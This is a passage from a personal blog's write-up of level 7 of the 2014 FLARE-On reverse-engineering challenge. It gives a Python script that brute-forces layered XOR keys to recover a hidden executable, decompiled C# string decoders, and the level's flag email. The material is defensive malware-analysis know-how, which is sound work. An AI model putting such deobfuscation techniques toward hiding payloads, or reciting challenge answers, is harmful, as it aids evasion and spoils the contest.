<span style="color: #93A1A1">key11[</span><span style="color: #2AA198">0</span><span style="color: #93A1A1">]</span><span style="color: #719e07">=</span><span style="color: #2AA198">&#39;</span><span style="color: #CB4B16">\x01\x02\x03\x05\x00\x78\x30\x38\x0d</span><span style="color: #2AA198">&#39;</span>
<span style="color: #93A1A1">key11[</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">]</span><span style="color: #719e07">=</span><span style="color: #2AA198">&#39;</span><span style="color: #CB4B16">\x07\x77</span><span style="color: #2AA198">&#39;</span>

<span style="color: #93A1A1">key12</span><span style="color: #719e07">=</span><span style="color: #93A1A1">{}</span>
<span style="color: #93A1A1">key12[</span><span style="color: #2AA198">0</span><span style="color: #93A1A1">]</span><span style="color: #719e07">=</span><span style="color: #2AA198">&quot;backdoge.exe&quot;</span>
<span style="color: #93A1A1">key12[</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">]</span><span style="color: #719e07">=</span><span style="color: #2AA198">&quot;</span><span style="color: #CB4B16">\x00</span><span style="color: #2AA198">&quot;</span>
 
<span style="color: #93A1A1">key13</span><span style="color: #719e07">=</span><span style="color: #93A1A1">{}</span>
<span style="color: #93A1A1">key13[</span><span style="color: #2AA198">0</span><span style="color: #93A1A1">]</span><span style="color: #719e07">=</span><span style="color: #2AA198">&#39;192.203.230.10&#39;</span>
<span style="color: #93A1A1">key13[</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">]</span><span style="color: #719e07">=</span><span style="color: #2AA198">&#39;</span><span style="color: #CB4B16">\x00</span><span style="color: #2AA198">&#39;</span>
 
<span style="color: #93A1A1">key14</span><span style="color: #719e07">=</span><span style="color: #93A1A1">{}</span>
<span style="color: #93A1A1">key14[</span><span style="color: #2AA198">0</span><span style="color: #93A1A1">]</span><span style="color: #719e07">=</span><span style="color: #2AA198">&#39;</span><span style="color: #CB4B16">\x00</span><span style="color: #2AA198">&#39;</span>
<span style="color: #93A1A1">key14[</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">]</span><span style="color: #719e07">=</span><span style="color: #2AA198">&#39;jackRAT&#39;</span>

<span style="color: #93A1A1">index</span><span style="color: #719e07">=</span><span style="color: #93A1A1">{}</span>
<span style="color: #719e07">for</span> <span style="color: #93A1A1">i</span> <span style="color: #719e07">in</span> <span style="color: #B58900">xrange</span><span style="color: #93A1A1">(</span><span style="color: #2AA198">15</span><span style="color: #93A1A1">):</span>
    <span style="color: #93A1A1">index[i]</span> <span style="color: #719e07">=</span> <span style="color: #2AA198">0</span>


<span style="color: #586E75"># we want this to support variable length keys</span>
<span style="color: #586E75"># so if the key is smaller than data, it will wrap around</span>
<span style="color: #719e07">def</span> <span style="color: #268BD2">xor</span><span style="color: #93A1A1">(mydata,mykey):</span>
    <span style="color: #93A1A1">keylen</span> <span style="color: #719e07">=</span> <span style="color: #B58900">len</span><span style="color: #93A1A1">(mykey)</span>
    <span style="color: #93A1A1">datalen</span> <span style="color: #719e07">=</span> <span style="color: #B58900">len</span><span style="color: #93A1A1">(mydata)</span>
    
    <span style="color: #586E75"># easier to just extend the key array, but probably not that memory efficient</span>
    <span style="color: #586E75"># not that we care about it here ;)</span>
    <span style="color: #93A1A1">key</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">mykey</span> <span style="color: #719e07">*</span> <span style="color: #93A1A1">(</span> <span style="color: #93A1A1">(datalen</span><span style="color: #719e07">/</span><span style="color: #93A1A1">keylen)</span><span style="color: #719e07">+</span><span style="color: #2AA198">1</span> <span style="color: #93A1A1">)</span> 
    
    <span style="color: #719e07">return</span> <span style="color: #2AA198">&#39;&#39;</span><span style="color: #719e07">.</span><span style="color: #93A1A1">join(</span><span style="color: #B58900">chr</span><span style="color: #93A1A1">(</span><span style="color: #B58900">ord</span><span style="color: #93A1A1">(a)</span> <span style="color: #719e07">^</span> <span style="color: #B58900">ord</span><span style="color: #93A1A1">(b))</span> <span style="color: #719e07">for</span> <span style="color: #93A1A1">a,b</span> <span style="color: #719e07">in</span> <span style="color: #B58900">zip</span><span style="color: #93A1A1">(mydata,key))</span>


<span style="color: #719e07">from</span> <span style="color: #93A1A1">binascii</span> <span style="color: #719e07">import</span> <span style="color: #93A1A1">hexlify,</span> <span style="color: #93A1A1">unhexlify</span>

<span style="color: #93A1A1">myfile</span> <span style="color: #719e07">=</span> <span style="color: #B58900">file</span><span style="color: #93A1A1">(</span><span style="color: #2AA198">&#39;c:</span><span style="color: #CB4B16">\\</span><span style="color: #2AA198">extractedgratz.exe&#39;</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">&#39;rb&#39;</span><span style="color: #93A1A1">)</span>

<span style="color: #93A1A1">wholefile</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">myfile</span><span style="color: #719e07">.</span><span style="color: #93A1A1">read()</span>

<span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">wholefile[:</span><span style="color: #2AA198">0x10</span><span style="color: #93A1A1">]</span>

<span style="color: #93A1A1">myfile</span><span style="color: #719e07">.</span><span style="color: #93A1A1">close()</span>


<span style="color: #93A1A1">counter</span> <span style="color: #719e07">=</span> <span style="color: #2AA198">0</span>

<span style="color: #719e07">for</span> <span style="color: #93A1A1">index[</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">in</span> <span style="color: #B58900">xrange</span><span style="color: #93A1A1">(</span><span style="color: #2AA198">2</span><span style="color: #93A1A1">):</span>
  <span style="color: #719e07">for</span> <span style="color: #93A1A1">index[</span><span style="color: #2AA198">2</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">in</span> <span style="color: #B58900">xrange</span><span style="color: #93A1A1">(</span><span style="color: #2AA198">2</span><span style="color: #93A1A1">):</span>
    <span style="color: #719e07">for</span> <span style="color: #93A1A1">index[</span><span style="color: #2AA198">3</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">in</span> <span style="color: #B58900">xrange</span><span style="color: #93A1A1">(</span><span style="color: #2AA198">2</span><span style="color: #93A1A1">):</span>
      <span style="color: #719e07">for</span> <span style="color: #93A1A1">index[</span><span style="color: #2AA198">4</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">in</span> <span style="color: #B58900">xrange</span><span style="color: #93A1A1">(</span><span style="color: #2AA198">2</span><span style="color: #93A1A1">):</span>
        <span style="color: #719e07">for</span> <span style="color: #93A1A1">index[</span><span style="color: #2AA198">5</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">in</span> <span style="color: #B58900">xrange</span><span style="color: #93A1A1">(</span><span style="color: #2AA198">2</span><span style="color: #93A1A1">):</span>
          <span style="color: #719e07">for</span> <span style="color: #93A1A1">index[</span><span style="color: #2AA198">6</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">in</span> <span style="color: #B58900">xrange</span><span style="color: #93A1A1">(</span><span style="color: #2AA198">2</span><span style="color: #93A1A1">):</span>
            <span style="color: #719e07">for</span> <span style="color: #93A1A1">index[</span><span style="color: #2AA198">7</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">in</span> <span style="color: #B58900">xrange</span><span style="color: #93A1A1">(</span><span style="color: #2AA198">2</span><span style="color: #93A1A1">):</span>
              <span style="color: #719e07">for</span> <span style="color: #93A1A1">index[</span><span style="color: #2AA198">8</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">in</span> <span style="color: #B58900">xrange</span><span style="color: #93A1A1">(</span><span style="color: #2AA198">2</span><span style="color: #93A1A1">):</span>
                <span style="color: #719e07">for</span> <span style="color: #93A1A1">index[</span><span style="color: #2AA198">9</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">in</span> <span style="color: #B58900">xrange</span><span style="color: #93A1A1">(</span><span style="color: #2AA198">2</span><span style="color: #93A1A1">):</span>
                  <span style="color: #719e07">for</span> <span style="color: #93A1A1">index[</span><span style="color: #2AA198">10</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">in</span> <span style="color: #B58900">xrange</span><span style="color: #93A1A1">(</span><span style="color: #2AA198">2</span><span style="color: #93A1A1">):</span>
                    <span style="color: #719e07">for</span> <span style="color: #93A1A1">index[</span><span style="color: #2AA198">11</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">in</span> <span style="color: #B58900">xrange</span><span style="color: #93A1A1">(</span><span style="color: #2AA198">2</span><span style="color: #93A1A1">):</span>
                      <span style="color: #719e07">for</span> <span style="color: #93A1A1">index[</span><span style="color: #2AA198">12</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">in</span> <span style="color: #B58900">xrange</span><span style="color: #93A1A1">(</span><span style="color: #2AA198">2</span><span style="color: #93A1A1">):</span>
                        <span style="color: #719e07">for</span> <span style="color: #93A1A1">index[</span><span style="color: #2AA198">13</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">in</span> <span style="color: #B58900">xrange</span><span style="color: #93A1A1">(</span><span style="color: #2AA198">2</span><span style="color: #93A1A1">):</span>
                          <span style="color: #719e07">for</span> <span style="color: #93A1A1">index[</span><span style="color: #2AA198">14</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">in</span> <span style="color: #B58900">xrange</span><span style="color: #93A1A1">(</span><span style="color: #2AA198">2</span><span style="color: #93A1A1">):</span>
                            <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(out,key1[index[</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">]])</span>
                            <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(out,key2[index[</span><span style="color: #2AA198">2</span><span style="color: #93A1A1">]])</span>
                            <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(out,key3[index[</span><span style="color: #2AA198">3</span><span style="color: #93A1A1">]])</span>
                            <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(out,key4[index[</span><span style="color: #2AA198">4</span><span style="color: #93A1A1">]])</span>
                            <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(out,key5[index[</span><span style="color: #2AA198">5</span><span style="color: #93A1A1">]])</span>
                            <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(out,key6[index[</span><span style="color: #2AA198">6</span><span style="color: #93A1A1">]])</span>
                            <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(out,key7[index[</span><span style="color: #2AA198">7</span><span style="color: #93A1A1">]])</span>
                            <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(out,key8[index[</span><span style="color: #2AA198">8</span><span style="color: #93A1A1">]])</span>
                            <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(out,key9[index[</span><span style="color: #2AA198">9</span><span style="color: #93A1A1">]])</span>
                            <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(out,key10[index[</span><span style="color: #2AA198">10</span><span style="color: #93A1A1">]])</span>
                            <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(out,key11[index[</span><span style="color: #2AA198">11</span><span style="color: #93A1A1">]])</span>
                            <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(out,key12[index[</span><span style="color: #2AA198">12</span><span style="color: #93A1A1">]])</span>
                            <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(out,key13[index[</span><span style="color: #2AA198">13</span><span style="color: #93A1A1">]])</span>
                            <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(out,key14[index[</span><span style="color: #2AA198">14</span><span style="color: #93A1A1">]])</span>
                            
                            <span style="color: #719e07">if</span> <span style="color: #93A1A1">(</span> <span style="color: #93A1A1">out[</span><span style="color: #2AA198">0</span><span style="color: #93A1A1">]</span><span style="color: #719e07">==</span><span style="color: #2AA198">&#39;M&#39;</span> <span style="color: #719e07">and</span> <span style="color: #93A1A1">out[</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">]</span><span style="color: #719e07">==</span><span style="color: #2AA198">&#39;Z&#39;</span><span style="color: #93A1A1">):</span>
                              <span style="color: #719e07">print</span> <span style="color: #2AA198">&quot;Found it&quot;</span>
                              <span style="color: #719e07">print</span> <span style="color: #93A1A1">out</span>
                              <span style="color: #719e07">print</span> <span style="color: #93A1A1">hexlify(out)</span>
                          
                              <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">wholefile</span>
                              
                              <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(out,key1[ind1])</span>
                              <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(out,key2[ind2])</span>
                              <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(out,key3[ind3])</span>
                              <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(out,key4[ind4])</span>
                              <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(out,key5[ind5])</span>
                              <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(out,key6[ind6])</span>
                              <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(out,key7[ind7])</span>
                              <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(out,key8[ind8])</span>
                              <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(out,key9[ind9])</span>
                              <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(out,key10[ind10])</span>
                              <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(out,key11[ind11])</span>
                              <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(out,key13[ind13])</span>
                              <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(out,key14[ind14])</span>
                              <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(out,</span><span style="color: #2AA198">&#39;backdoge.exe&#39;</span><span style="color: #93A1A1">)</span>
                          
                              <span style="color: #93A1A1">decodedfilename</span> <span style="color: #719e07">=</span> <span style="color: #2AA198">&quot;c:</span><span style="color: #CB4B16">\\</span><span style="color: #2AA198">gratz&quot;</span> <span style="color: #719e07">+</span> <span style="color: #B58900">str</span><span style="color: #93A1A1">(counter)</span> <span style="color: #719e07">+</span> <span style="color: #2AA198">&quot;.exe&quot;</span>
                              <span style="color: #93A1A1">decodedfile</span> <span style="color: #719e07">=</span> <span style="color: #B58900">file</span><span style="color: #93A1A1">(decodedfilename,</span><span style="color: #2AA198">&#39;wb&#39;</span><span style="color: #93A1A1">)</span>
                              <span style="color: #93A1A1">decodedfile</span><span style="color: #719e07">.</span><span style="color: #93A1A1">write(out)</span>
                              <span style="color: #93A1A1">decodedfile</span><span style="color: #719e07">.</span><span style="color: #93A1A1">close()</span>
                                
                            <span style="color: #586E75"># be sure to reset the wholefile after reading it, thanks Curtis :)                                                                  </span>
                            <span style="color: #93A1A1">out</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">wholefile[:</span><span style="color: #2AA198">0x10</span><span style="color: #93A1A1">]</span>
                            <span style="color: #93A1A1">counter</span> <span style="color: #719e07">+=</span><span style="color: #2AA198">1</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>It&rsquo;s a bad bruteforcer but it does the job. To speed things up, it only performs the xor-es with the first <code>0x80</code> bytes of the binary which is the <code>DOS Stub</code>. In the end, it compares the first two bytes with <code>MZ</code> and then xor-es the whole binary before writing it to a file.</p>

<p>I got two files and after opening them in hex editors, one was clearly a false positive. I executed the correct binary.</p>

<p><img src="/images/2014/flare/7-23.jpg" alt="Almost done" title="Almost done" /></p>

<p>But we cannot see the email. Augh. This is a .NET application. We need to decompile it like the first challenge.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>Decompiled gratz.exe</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #719e07">public</span> <span style="color: #268BD2">Form1</span><span style="color: #93A1A1">()</span>
<span style="color: #93A1A1">{</span>
  <span style="color: #719e07">this</span><span style="color: #93A1A1">.InitializeComponent();</span>
  <span style="color: #719e07">new</span> <span style="color: #268BD2">Thread</span><span style="color: #93A1A1">(</span><span style="color: #719e07">new</span> <span style="color: #93A1A1">ThreadStart(</span><span style="color: #719e07">this</span><span style="color: #93A1A1">.lulzors)).Start();</span>
<span style="color: #93A1A1">}</span>

<span style="color: #719e07">public</span> <span style="color: #719e07">void</span> <span style="color: #268BD2">lulzors</span><span style="color: #93A1A1">()</span>
<span style="color: #93A1A1">{</span>
  <span style="color: #93A1A1">lulz</span> <span style="color: #93A1A1">lulz</span> <span style="color: #93A1A1">=</span> <span style="color: #719e07">new</span> <span style="color: #93A1A1">lulz();</span>
  <span style="color: #93A1A1">Thread</span> <span style="color: #93A1A1">thread</span> <span style="color: #93A1A1">=</span> <span style="color: #719e07">new</span> <span style="color: #93A1A1">Thread(</span><span style="color: #719e07">new</span> <span style="color: #93A1A1">ThreadStart(lulz.datwork));</span>
  <span style="color: #93A1A1">thread.Start();</span>
  <span style="color: #719e07">do</span>
    <span style="color: #93A1A1">;</span>
  <span style="color: #719e07">while</span> <span style="color: #93A1A1">(thread.IsAlive);</span>
  <span style="color: #719e07">this</span><span style="color: #93A1A1">.label2.Text</span> <span style="color: #93A1A1">=</span> <span style="color: #93A1A1">lulz.decoder4(</span><span style="color: #2AA198">&quot;\v\fP\x000E\x000FBA\x0006\rG\x0015I\x001A\x0001\x0016H\\\t\b\x0002\x0013/\b\t^\x001D\bJO\a]C\x001B\x0005&quot;</span><span style="color: #93A1A1">);</span>
<span style="color: #93A1A1">}</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>And inside <code>lulz.cs</code>.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>lulz.cs</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #586E75">// decoder1 and decoder3 omitted</span>

<span style="color: #719e07">public</span> <span style="color: #DC322F">string</span> <span style="color: #268BD2">decoder2</span><span style="color: #93A1A1">(</span><span style="color: #DC322F">string</span> <span style="color: #93A1A1">encoded)</span>
<span style="color: #93A1A1">{</span>
  <span style="color: #DC322F">string</span> <span style="color: #93A1A1">str1</span> <span style="color: #93A1A1">=</span> <span style="color: #2AA198">&quot;&quot;</span><span style="color: #93A1A1">;</span>
  <span style="color: #DC322F">string</span> <span style="color: #93A1A1">str2</span> <span style="color: #93A1A1">=</span> <span style="color: #2AA198">&quot;this&quot;</span><span style="color: #93A1A1">;</span>
  <span style="color: #719e07">for</span> <span style="color: #93A1A1">(</span><span style="color: #DC322F">int</span> <span style="color: #93A1A1">index</span> <span style="color: #93A1A1">=</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">;</span> <span style="color: #93A1A1">index</span> <span style="color: #93A1A1">&lt;</span> <span style="color: #93A1A1">encoded.Length;</span> <span style="color: #93A1A1">++index)</span>
    <span style="color: #93A1A1">str1</span> <span style="color: #93A1A1">=</span> <span style="color: #93A1A1">str1</span> <span style="color: #93A1A1">+</span> <span style="color: #93A1A1">(</span><span style="color: #DC322F">object</span><span style="color: #93A1A1">)</span> <span style="color: #93A1A1">(</span><span style="color: #DC322F">char</span><span style="color: #93A1A1">)</span> <span style="color: #93A1A1">((</span><span style="color: #DC322F">uint</span><span style="color: #93A1A1">)</span> <span style="color: #93A1A1">encoded[index]</span> <span style="color: #93A1A1">^</span> <span style="color: #93A1A1">(</span><span style="color: #DC322F">uint</span><span style="color: #93A1A1">)</span> <span style="color: #93A1A1">str2[index</span> <span style="color: #93A1A1">%</span> <span style="color: #93A1A1">str2.Length]);</span>
  <span style="color: #719e07">return</span> <span style="color: #93A1A1">str1;</span>
<span style="color: #93A1A1">}</span>

<span style="color: #719e07">public</span> <span style="color: #DC322F">string</span> <span style="color: #268BD2">decoder4</span><span style="color: #93A1A1">(</span><span style="color: #DC322F">string</span> <span style="color: #93A1A1">encoded)</span>
<span style="color: #93A1A1">{</span>
  <span style="color: #DC322F">string</span> <span style="color: #93A1A1">str1</span> <span style="color: #93A1A1">=</span> <span style="color: #2AA198">&quot;&quot;</span><span style="color: #93A1A1">;</span>
  <span style="color: #DC322F">string</span> <span style="color: #93A1A1">str2</span> <span style="color: #93A1A1">=</span> <span style="color: #719e07">this</span><span style="color: #93A1A1">.decoder2(</span><span style="color: #2AA198">&quot;\x001B\x0005\x000ES\x001D\x001BI\a\x001C\x0001\x001AS\0\0\fS\x0006\r\b\x001FT\a\a\x0016K&quot;</span><span style="color: #93A1A1">);</span>
  <span style="color: #719e07">for</span> <span style="color: #93A1A1">(</span><span style="color: #DC322F">int</span> <span style="color: #93A1A1">index</span> <span style="color: #93A1A1">=</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">;</span> <span style="color: #93A1A1">index</span> <span style="color: #93A1A1">&lt;</span> <span style="color: #93A1A1">encoded.Length;</span> <span style="color: #93A1A1">++index)</span>
    <span style="color: #93A1A1">str1</span> <span style="color: #93A1A1">=</span> <span style="color: #93A1A1">str1</span> <span style="color: #93A1A1">+</span> <span style="color: #93A1A1">(</span><span style="color: #DC322F">object</span><span style="color: #93A1A1">)</span> <span style="color: #93A1A1">(</span><span style="color: #DC322F">char</span><span style="color: #93A1A1">)</span> <span style="color: #93A1A1">((</span><span style="color: #DC322F">uint</span><span style="color: #93A1A1">)</span> <span style="color: #93A1A1">encoded[index]</span> <span style="color: #93A1A1">^</span> <span style="color: #93A1A1">(</span><span style="color: #DC322F">uint</span><span style="color: #93A1A1">)</span> <span style="color: #93A1A1">str2[index</span> <span style="color: #93A1A1">%</span> <span style="color: #93A1A1">str2.Length]);</span>
  <span style="color: #719e07">return</span> <span style="color: #93A1A1">str1;</span>
<span style="color: #93A1A1">}</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>We can either write code or paste it into an online C# compiler. In the end we have the flag:</p>

<h4 id="level-7-flag-da7-f1are-finish-lin3-flare-on-com:94bf06dd1bee42f6b34a1ff79274f7e7">Level 7 flag: da7.f1are.finish.lin3@flare-on.com</h4>

<p>And the email:</p>
<div class="highlight" style="background: #002B36"><pre style="line-height: 125%">Alright, we give in. You&#39;ve done it. Your reversing-fu is strong.
I&#39;ll pass your info on to the FLARE team and someone will be in touch.
-FLARE
</pre></div>

        </div>
        

<footer>
  <p class="meta">
    <span class="byline author vcard">Posted by <span class="fn">Parsia</span></span>
    
    <time>Sep 23, 2014</time>
    <span class="categories">
      Tags: 
        
        
          <a class="category" href="http://parsiya.net/tags/flareon">FlareOn</a>  <a class="category" href="http://parsiya.net/tags/writeup">Writeup</a>  <a class="category" href="http://parsiya.net/tags/fireeye">FireEye</a>  
        
    </span>
  </p>
    
  
  

  

  <p class="meta">
    
        <a class="basic-alignment left" href="http://parsiya.net/blog/2014-09-21-malware-adventure/" title="Malware Adventure">Malware Adventure</a>
    

     
      <a class="basic-alignment right" href="http://parsiya.net/blog/2014-11-18-building-memfetch-on-kali--comments/" title="Building memfetch on Kali &#43; Comments">Building memfetch on Kali &#43; Comments</a>
    
  </p>

  <div id="disqus_thread"></div>
<script type="text/javascript">

(function() {
    
    
    
    

    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
    var disqus_shortname = 'parsiya';
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</footer>

 
      </article>
    </div>
    


<aside class="sidebar thirds">
  <section class="first odd">
    <h1>Who am I?</h1>
    <p>I am Parsia Hakimian. Current (mostly) security consultant at <a target="_blank" href="http://cigital.com" title="cigital">Cigital</a>.</p>
    <p>I am interested in infosec, reverse engineering, Python, C and EvE Online (not necessarily in that order). My email is parsiya[att]google's email.</p>

    
  </section>

  



  <ul class="sidebar-nav">
    <li class="sidebar-nav-item">
    <a target="_blank" href="https://github.com/parsiya/" title="https://github.com/parsiya/"><i class="fa fa-github fa-3x"></i></a>
    <a target="_blank" href="https://bitbucket.org/parsiya/" title="https://bitbucket.org/parsiya/"><i class="fa fa-bitbucket fa-3x"></i></a>
    
    
    
    
    <a target="_blank" href="https://twitter.com/cryptogangsta/" title="https://twitter.com/cryptogangsta/"><i class="fa fa-twitter fa-3x"></i></a>
    
    <a target="_blank" href="https://keybase.io/parsiya/" title="https://keybase.io/parsiya/"><i class="fa fa-key fa-3x"></i></a> 

    
    
    </li>
  </ul>

  
  <section class="even">
    <h1>Recent Posts</h1>

    
    <ul id="recent_posts">
      
      
        
      
      
      <li class="post">
        <a href="/blog/2016-02-14-archive-page-in-hugo/">Archive Page in Hugo</a>
      </li>
      
      <li class="post">
        <a href="/blog/2016-02-02-from-octopress-to-hugo/">From Octopress to Hugo</a>
      </li>
      
      <li class="post">
        <a href="/blog/2016-01-31-why-hugo/">Why Hugo?</a>
      </li>
      
      <li class="post">
        <a href="/blog/2015-11-14-intro-to-.net-remoting-for-hackers/">Intro to .NET Remoting for Hackers</a>
      </li>
      
      <li class="post">
        <a href="/blog/2015-10-19-proxying-hipchat-part-3-ssl-added-and-removed-here/">Proxying Hipchat Part 3: SSL Added and Removed Here :^)</a>
      </li>
      
    </ul>
  </section>

</aside>

  </div>
</div>




<footer role="contentinfo">
  <p>Copyright &copy; 2016 Parsia - <a href="http://parsiya.net/license/">License</a> - 
  <span class="credit">Powered by <a target="_blank" href="https://gohugo.io">Hugo</a> and <a target="_blank" href="https://github.com/parsiya/hugo-octopress/">Hugo-Octopress</a> theme.
</p>

</footer>


<script>
  var _gaq=[['_setAccount','UA-55491306-1'],['_trackPageview']];
  (function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];
  g.src=('https:'==location.protocol?'//ssl':'//www')+'.google-analytics.com/ga.js';
  s.parentNode.insertBefore(g,s)}(document,'script'));
</script>

</body>
</html>

